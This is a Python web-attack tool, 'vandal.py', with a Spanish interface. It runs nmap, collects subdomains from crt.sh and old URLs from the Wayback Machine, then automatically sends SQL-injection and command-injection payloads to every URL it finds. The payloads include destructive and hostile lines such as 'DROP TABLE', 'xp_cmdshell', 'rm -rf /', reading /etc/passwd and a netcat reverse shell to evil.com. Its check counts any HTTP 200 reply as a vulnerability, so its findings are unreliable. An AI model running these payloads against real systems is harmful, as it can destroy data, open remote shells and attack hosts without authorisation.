import os
import subprocess
import requests
import time
import sys

def show_warning():
    print("\033[91mADVERTENCIA: Esta herramienta debe ser utilizada solo para fines éticos y legales.")
    print("El autor no se hace responsable del uso indebido de esta herramienta.")
    print("Asegúrate de tener permiso explícito antes de realizar escaneos.\033[0m\n")

def show_help():
    print("Uso: python3 vandal.py [url]")
    print("Opciones:")
    print("  -h, --help")
    print("Ejemplo:")
    print("  python3 vandal.py http://example.com https://example.com example.com")
    sys.exit()

def print_logo():
    logo = """
    \033[1;37m██╗░░░██╗░█████╗░███╗░░██╗██████╗░░█████╗░██╗░░░░░
    ██║░░░██║██╔══██╗████╗░██║██╔══██╗██╔══██╗██║░░░░░
    ╚██╗░██╔╝███████║██╔██╗██║██║░░██║███████║██║░░░░░
    ░╚████╔╝░██╔══██║██║╚████║██║░░██║██╔══██║██║░░░░░
    ░░╚██╔╝░░██║░░██║██║░╚███║██████╔╝██║░░██║███████╗
    ░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝╚══════╝
                  By \033[1;37m44Viicius \033[1;35m<3\033[0m
    """
    print(logo)

def set_user_agent():
    choice = input("¿Quieres agregar un User-Agent personalizado? (s/n): ").lower()
    if choice == 's':
        return input("Introduce el User-Agent personalizado: ")
    return None

def set_scan_delay():
    print("Elige un retraso entre escaneos recomendado:")
    print("1. 200 ms (muy seguro)")
    print("2. 300 ms (seguro)")
    print("3. 500 ms (moderado)")
    print("4. 1 minuto (alto)")
    option = input("Selecciona una opción (1/2/3/4): ")

    if option == '1':
        return 0.2
    elif option == '2':
        return 0.3
    elif option == '3':
        return 0.5
    elif option == '4':
        return 60
    else:
        print("Opción no válida, usando 200 ms por defecto.")
        return 0.2

def scan_ports(url, user_agent):
    domain = clean_url(url)
    print(f"Escaneando puertos para {domain}...")
    try:
        command = ["nmap", domain]
        if user_agent:
            command.append(f"--script-args=http.useragent={user_agent}")
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError:
        print("Error en el escaneo de puertos.")

def clean_url(url):
    return url.replace("https://", "").replace("http://", "")

def show_response_details(response):
    if response.status_code == 200:
        print("\033[34mCódigo de estado: 200\033[0m")
    elif response.status_code >= 400:
        print(f"\033[91mCódigo de estado: {response.status_code}\033[0m")
    else:
        print(f"Código de estado: {response.status_code}")
    
    if 'Server' in response.headers:
        print(f"Servidor: {response.headers['Server']}")
    if 'X-Powered-By' in response.headers:
        print(f"Tecnología: {response.headers['X-Powered-By']}")
    print()

def is_valid_url(url):
    return url.startswith(('http://', 'https://')) and len(url) > 7

def find_subdomains(domain, user_agent):
    print(f"Buscando subdominios para {domain}...")
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    headers = {'User-Agent': user_agent} if user_agent else {}
    
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        subdomains = set(entry['name_value'] for entry in response.json())
        for sub in subdomains:
            print(sub)
            try:
                subdomain_response = requests.get(f"http://{sub}", headers=headers)
                show_response_details(subdomain_response)
                # Buscar vulnerabilidades de inyección en cada subdominio
                scan_vulnerabilities(subdomain_response.url, user_agent)
            except requests.exceptions.RequestException as e:
                print(f"Error al acceder a {sub}: {e}")
    except requests.exceptions.HTTPError as http_err:
        print(f"Error HTTP al buscar subdominios: {http_err}")
    except Exception as e:
        print(f"Error durante la búsqueda de subdominios: {e}")

def wayback_urls(domain, user_agent):
    print(f"Buscando URLs antiguas de {domain} en Wayback Machine...")
    url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
    headers = {'User-Agent': user_agent} if user_agent else {}

    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            urls = [entry[0] for entry in response.json()[1:]]
            for wayback_url in urls:
                print(wayback_url)
                try:
                    wayback_response = requests.get(wayback_url, headers=headers)
                    show_response_details(wayback_response)
                    # Buscar vulnerabilidades de inyección en cada URL archivada
                    scan_vulnerabilities(wayback_url, user_agent)
                except requests.exceptions.RequestException as e:
                    print(f"Error al acceder a {wayback_url}: {e}")
        else:
            print("Error al buscar URLs en Wayback Machine.")
    except Exception as e:
        print(f"Error durante la búsqueda en Wayback Machine: {e}")

def check_security_headers(url):
    try:
        response = requests.get(url)
        headers = response.headers
        vulnerabilities = []
        if 'X-Frame-Options' not in headers:
            vulnerabilities.append("Falta 'X-Frame-Options'")
        if 'Content-Security-Policy' not in headers:
            vulnerabilities.append("Falta 'Content-Security-Policy'")
        if 'X-XSS-Protection' not in headers:
            vulnerabilities.append("Falta 'X-XSS-Protection'")
        if 'Strict-Transport-Security' not in headers:
            vulnerabilities.append("Falta 'Strict-Transport-Security'")
        return vulnerabilities
    except requests.RequestException as e:
        print(f"Error al comprobar los encabezados de seguridad: {e}")
        return []

def sql_injection(url):
    sql_payloads = [
        "' OR '1'='1'; --",
        "' OR '1'='1' /*",
        "'; DROP TABLE users; --",
        "'; EXEC xp_cmdshell('net user'); --",
        "' UNION SELECT NULL, username, password FROM users; --",
        '" OR "1"="1"; --',
        '" AND "1"="1"; --',
        "'; EXEC sp_msforeachtable 'DROP TABLE ?'; --",
        "'; SELECT * FROM information_schema.tables; --",
        "'; SELECT user(), version(); --",
        "'; SELECT current_user(); --",
        "' AND 1=2 UNION SELECT username, password FROM users; --",
        "' AND (SELECT COUNT(*) FROM users) > 0; --",
        "' HAVING 1=1; --",
        "' ORDER BY 1; --",
        "' GROUP BY CONCAT(username,0x3a,password) HAVING COUNT(*) > 0; --",
        "'; WAITFOR DELAY '0:0:5'; --",
        "' AND 'x'='x'; --",
        "' AND SUBSTRING(@@version, 1, 1) = '5'; --"
    ]
    vulnerabilities = []
    for payload in sql_payloads:
        full_url = f"{url}?input={payload}"
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                vulnerabilities.append(full_url)
                time.sleep(0.2)
        except requests.exceptions.RequestException:
            pass
    return vulnerabilities

def command_injection(url):
    command_payloads = [
        "; ls",
        "&& ls",
        "| ls",
        "ls",
        "&& id",
        "; cat /etc/passwd",
        "; uname -a",
        "; whoami",
        "; netstat -an",
        "; ps aux",
        "; curl http://evil.com",
        "; wget http://evil.com",
        "; ping -c 4 127.0.0.1",
        "&& nc -e /bin/bash evil.com 4444",
        "; rm -rf /",
        "; echo vulnerable",
    ]
    vulnerabilities = []
    for payload in command_payloads:
        full_url = f"{url}?cmd={payload}"
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                vulnerabilities.append(full_url)
                time.sleep(0.2)
        except requests.exceptions.RequestException:
            pass
    return vulnerabilities

# Escanear vulnerabilidades de SQL Injection y Command Injection en subdominios y URLs
def scan_vulnerabilities(url, user_agent):
    print(f"Escaneando vulnerabilidades de inyección en: {url}...")
    sql_vulnerabilities = sql_injection(url)
    if sql_vulnerabilities:
        print("Vulnerabilidades de SQL Injection encontradas en:")
        for vuln in sql_vulnerabilities:
            print(f"- {vuln}")
    else:
        print("No se encontraron vulnerabilidades de SQL Injection.")

    command_vulnerabilities = command_injection(url)
    if command_vulnerabilities:
        print("Vulnerabilidades de Command Injection encontradas en:")
        for vuln in command_vulnerabilities:
            print(f"- {vuln}")
    else:
        print("No se encontraron vulnerabilidades de Command Injection.")

def scan_url(url, user_agent):
    if is_valid_url(url):
        print(f"Escaneando URL: {url}...")
        headers = {'User-Agent': user_agent} if user_agent else {}

        try:
            response = requests.get(url, headers=headers)
            show_response_details(response)

            print("Comprobando encabezados de seguridad...")
            vulnerabilities = check_security_headers(url)
            if vulnerabilities:
                print("Encabezados de seguridad faltantes o mal configurados:")
                for vulnerability in vulnerabilities:
                    print(f"- {vulnerability}")
            else:
                print("Todos los encabezados de seguridad están presentes.")
            
            print("Realizando pruebas de SQL Injection...")
            sql_vulnerabilities = sql_injection(url)
            if sql_vulnerabilities:
                print("Vulnerabilidades de SQL Injection encontradas en:")
                for vuln in sql_vulnerabilities:
                    print(f"- {vuln}")
            else:
                print("No se encontraron vulnerabilidades de SQL Injection.")

            print("Realizando pruebas de Command Injection...")
            command_vulnerabilities = command_injection(url)
            if command_vulnerabilities:
                print("Vulnerabilidades de Command Injection encontradas en:")
                for vuln in command_vulnerabilities:
                    print(f"- {vuln}")
            else:
                print("No se encontraron vulnerabilidades de Command Injection.")

        except requests.exceptions.RequestException as e:
            print(f"Error al acceder a {url}: {e}")
    else:
        print("URL inválida.")

def main():
    print_logo()
    show_warning()
    
    if len(sys.argv) < 2 or '-h' in sys.argv or '--help' in sys.argv:
        show_help()

    urls = sys.argv[1:]
    user_agent = set_user_agent()
    delay = set_scan_delay()

    for url in urls:
        scan_url(url, user_agent)
        find_subdomains(clean_url(url), user_agent)
        wayback_urls(clean_url(url), user_agent)
        time.sleep(delay)

if __name__ == "__main__":
    main()

